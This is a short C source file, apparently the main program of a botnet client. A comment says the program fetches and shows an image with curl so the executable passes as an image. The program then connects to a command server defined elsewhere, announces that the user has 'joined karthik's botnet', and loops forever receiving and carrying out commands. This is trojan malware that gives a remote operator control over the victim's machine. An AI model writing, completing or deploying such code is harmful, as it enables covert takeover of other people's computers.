#include "lib/utils.h"
#include "lib/macros.h"
#include "lib/connect.h"

int main(void) {
	//download and present image using curl to operate executable as an image
	char* open_cmd = alias_img();
	system(open_cmd);
	free(open_cmd);

	char msg[CMD_LENGTH];
	char* name = getenv("USER");
	int channel = init_channel(SERVER, PORT, name);
	printf("%s joined karthik's botnet\n", name);

	while(1) {
		recieve(channel, msg);
		parse(channel, msg);	
	}
}